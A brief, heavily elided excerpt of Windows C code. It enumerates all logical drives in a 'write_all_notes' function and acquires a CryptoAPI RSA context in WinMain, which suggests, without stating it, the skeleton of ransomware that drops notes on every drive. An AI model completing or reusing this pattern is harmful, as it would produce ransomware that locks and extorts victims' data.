...
static void write_all_notes(void) {
    wchar_t d[256];
    DWORD l = GetLogicalDriveStringsW(256, d);
    wchar_t *p = d;
    while (*p) {
...
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    ...
    CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    if (!g_prov)
        CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET);
